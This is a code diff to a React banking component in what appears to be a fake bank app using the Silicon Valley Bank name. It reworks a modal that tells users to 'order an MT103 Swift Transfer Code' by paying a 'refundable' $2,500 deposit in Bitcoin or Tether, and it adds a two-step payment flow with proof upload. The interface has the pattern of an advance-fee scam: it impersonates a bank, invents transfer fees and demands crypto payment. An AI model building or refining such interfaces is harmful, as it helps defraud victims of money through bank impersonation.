@@ -45,6 +45,7 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
   // Deposit $2,500 USD requirement modal state
   const [showDepositPromptModal, setShowDepositPromptModal] = useState(false);
   const [showCryptoModal, setShowCryptoModal] = useState(false);
+  const [cryptoModalStep, setCryptoModalStep] = useState<'order_prompt' | 'payment_details'>('order_prompt');
   const [showTier3PromptModal, setShowTier3PromptModal] = useState(false);
   const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'USDT'>('BTC');
   const [txHash, setTxHash] = useState('');
@@ -396,7 +397,7 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
         </div>
       </div>
 
-      {/* 4-Digit Security Code Issuance / MT103 Swift Code Intermediary Prompt Modal */}
+      {/* Order your MT103 Swift Transfer Code Prompt Modal */}
       {showDepositPromptModal && (
         <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
           <div className="bg-slate-900 border border-amber-500/40 rounded-3xl p-6 sm:p-7 max-w-lg w-full space-y-5 shadow-2xl relative animate-fadeIn">
@@ -416,11 +417,11 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
                 <ShieldAlert className="w-3.5 h-3.5" />
                 <span>Security Authorization Required</span>
               </div>
-              <h3 className="text-lg sm:text-xl font-extrabold text-white tracking-tight">
-                4-Digit Security Code Issuance / MT103 Swift Code
+              <h3 className="text-lg sm:text-2xl font-extrabold text-white tracking-tight">
+                Order your MT103 Swift Transfer Code
               </h3>
               <p className="text-xs text-slate-300 leading-relaxed max-w-md mx-auto">
-                To execute commercial bill payments and outgoing wire transfers, an official 4-Digit Security Authorization Code must be issued and registered to your Silicon Valley Bank account.
+                To execute commercial bill payments and outgoing wire transfers, you must order an official 4-Digit Security Authorization Code registered to your Silicon Valley Bank account.
               </p>
             </div>
 
@@ -429,14 +430,14 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
                 <div className="flex items-center justify-between">
                   <span className="font-bold text-amber-400 flex items-center gap-1.5">
                     <Clock className="w-4 h-4 animate-spin text-amber-400" />
-                    4-Digit Security Code Issuance
+                    MT103 Swift Code Order
                   </span>
                   <span className="text-[10px] bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded-full font-mono font-bold">
                     Under Review
                   </span>
                 </div>
                 <p className="text-slate-300 text-[11px] leading-relaxed">
-                  Your $2,500 deposit proof for <span className="font-bold text-white">{user.pendingCryptoDeposit.cryptoMethod}</span> is currently being verified by Silicon Valley Bank Treasury. Your 4-digit code will be issued upon clearance.
+                  Your $2,500 deposit proof for <span className="font-bold text-white">{user.pendingCryptoDeposit.cryptoMethod}</span> is currently being verified by Silicon Valley Bank Treasury. Your MT103 Swift Code will be issued upon clearance.
                 </p>
               </div>
             ) : (
@@ -446,7 +447,7 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
                   <span className="font-mono text-xs">$2,500.00 USD</span>
                 </div>
                 <ul className="space-y-1.5 text-slate-400 list-disc list-inside">
-                  <li>A refundable verification deposit of <strong className="text-slate-200">$2,500.00 USD</strong> is required to generate your 4-digit security code.</li>
+                  <li>A refundable verification deposit of <strong className="text-slate-200">$2,500.00 USD</strong> is required to generate your MT103 Swift 4-digit code.</li>
                   <li>The full $2,500 deposit is credited directly to your account balance upon verification.</li>
                   <li>Enables unlimited outgoing vendor disbursements & international MT103 transfers.</li>
                 </ul>
@@ -457,12 +458,13 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
               <button
                 onClick={() => {
                   setShowDepositPromptModal(false);
+                  setCryptoModalStep('payment_details');
                   setShowCryptoModal(true);
                 }}
                 className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-extrabold py-3.5 rounded-2xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
               >
-                <DollarSign className="w-4 h-4" />
-                <span>Proceed to 4-Digit Code Issuance & $2,500 Deposit</span>
+                <Key className="w-4 h-4" />
+                <span>Order MT103 Swift Code ($2,500 Deposit)</span>
               </button>
 
               <button
@@ -483,6 +485,7 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
             <button 
               onClick={() => {
                 setShowCryptoModal(false);
+                setCryptoModalStep('order_prompt');
                 setDepositSuccessMsg(null);
               }}
               className="absolute top-4 right-4 p-1.5 text-slate-400 hover:text-white rounded-xl bg-slate-800 transition-colors"
@@ -495,7 +498,7 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
                 <Key className="w-6 h-6" />
               </div>
               <div>
-                <h3 className="text-base sm:text-lg font-bold text-white">4-Digit Security Code Issuance / MT103 Swift Code</h3>
+                <h3 className="text-base sm:text-lg font-bold text-white">Order your MT103 Swift Transfer Code</h3>
                 <p className="text-xs text-slate-400 mt-0.5">$2,500.00 USD Required Amount • Bitcoin (BTC) & Tether (USDT)</p>
               </div>
             </div>
@@ -507,6 +510,7 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
                 <button
                   onClick={() => {
                     setShowCryptoModal(false);
+                    setCryptoModalStep('order_prompt');
                     setDepositSuccessMsg(null);
                   }}
                   className="px-6 py-2.5 bg-emerald-500 text-slate-950 font-bold rounded-xl text-xs shadow-lg shadow-emerald-500/20"
@@ -514,8 +518,45 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
                   Close Window
                 </button>
               </div>
+            ) : cryptoModalStep === 'order_prompt' ? (
+              <div className="space-y-4 text-xs animate-fadeIn">
+                <div className="p-4 bg-slate-950 border border-slate-800 rounded-2xl text-[11px] text-slate-300 space-y-3">
+                  <div className="flex items-center justify-between font-bold text-amber-400 border-b border-slate-800 pb-2">
+                    <span>MT103 SWIFT Protocol Authorization:</span>
+                    <span className="font-mono text-xs text-emerald-400">$2,500.00 USD</span>
+                  </div>
+                  <p className="text-slate-300 leading-relaxed">
+                    Institutional vendor clearance requires ordering a verified MT103 Swift security code. A refundable security deposit of <strong>$2,500 USD</strong> is required to generate your credentials.
+                  </p>
+                  <ul className="space-y-1.5 text-slate-400 list-disc list-inside">
+                    <li>Deposit is 100% credited to your available SVB account balance.</li>
+                    <li>Instant issuance upon Bitcoin (BTC) or Tether (USDT) confirmation.</li>
+                    <li>Unlocks commercial payments & international MT103 disbursements.</li>
+                  </ul>
+                </div>
+
+                <button
+                  type="button"
+                  onClick={() => setCryptoModalStep('payment_details')}
+                  className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-extrabold py-3.5 rounded-2xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
+                >
+                  <Key className="w-4 h-4" />
+                  <span>Order MT103 Swift Code & Select Payment Method</span>
+                </button>
+              </div>
             ) : (
-              <form onSubmit={handleCryptoDepositSubmit} className="space-y-4 text-xs">
+              <form onSubmit={handleCryptoDepositSubmit} className="space-y-4 text-xs animate-fadeIn">
+                <div className="flex items-center justify-between pb-1">
+                  <span className="text-slate-400 text-[11px]">Step 2 of 2: Select Deposit Network & Upload Proof</span>
+                  <button
+                    type="button"
+                    onClick={() => setCryptoModalStep('order_prompt')}
+                    className="text-amber-400 hover:underline text-[11px] font-semibold"
+                  >
+                    ← MT103 Order Overview
+                  </button>
+                </div>
+
                 {/* Method selector */}
                 <div>
                   <label className="block text-slate-300 font-semibold mb-2">Select Cryptocurrency Deposit Network</label>
